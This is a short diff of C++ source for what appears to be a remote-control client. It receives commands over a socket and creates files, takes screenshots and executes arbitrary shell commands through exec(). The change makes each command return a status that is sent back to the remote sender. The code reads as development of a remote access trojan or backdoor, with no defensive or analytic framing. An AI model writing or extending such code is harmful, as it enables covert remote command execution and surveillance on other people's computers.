@@ -62,7 +62,7 @@ int main() {
 
 							if (iRecv != SOCKET_ERROR) {
 
-								CommandsHandler(message);
+								SendMsg(CommandsHandler(message));
 
 							}
 							else Connected = false;
@@ -217,6 +217,7 @@ std::string CommandsHandler(std::string msg) {
 			std::ofstream file(path);
 			if (file.is_open()) {
 				file.close();
+				return "Done";
 			}
 			else {
 				return "File filed to create";
@@ -238,6 +239,7 @@ std::string CommandsHandler(std::string msg) {
 			std::string path = loc;
 			path.append(fileName);
 			TakeScreenShot(path);
+			return "Done";
 		}
 		else {
 			return "Invalid Syntax of create cmd";
@@ -247,6 +249,7 @@ std::string CommandsHandler(std::string msg) {
 		if (msg.find(" ") == 7) {
 			std::string cmd = split(msg, 8, msg.length());
 			exec(cmd);
+			return "null";
 		}
 	}
 
@@ -255,6 +258,7 @@ std::string CommandsHandler(std::string msg) {
 	else {
 		return "Invalid Syntax";
 	}
+	return "";
 }
 
 std::string split(std::string str, int from, int to) {
